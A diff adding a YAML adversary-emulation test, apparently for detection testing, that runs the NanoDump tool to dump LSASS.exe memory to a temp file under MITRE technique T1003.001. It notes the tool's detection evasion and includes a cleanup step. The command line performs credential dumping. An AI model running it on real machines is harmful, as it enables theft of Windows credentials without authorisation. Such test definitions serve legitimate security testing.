@@ -1,0 +1,23 @@
+- description: 'The NanoDump tool uses syscalls and an invalid dump signature to avoid
+    detection.
+
+
+    https://github.com/helpsystems/nanodump
+
+
+    Upon successful execution, you should find the nanondump.dmp file in the temp
+    directory
+
+    '
+  id: 990a4629-d154-6220-98b7-0ba50384051f
+  name: Dump LSASS.exe Memory using NanoDump
+  platforms:
+    windows:
+      cmd:
+        cleanup: del "%temp%\nanodump.dmp" >nul 2> nul
+        command: PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
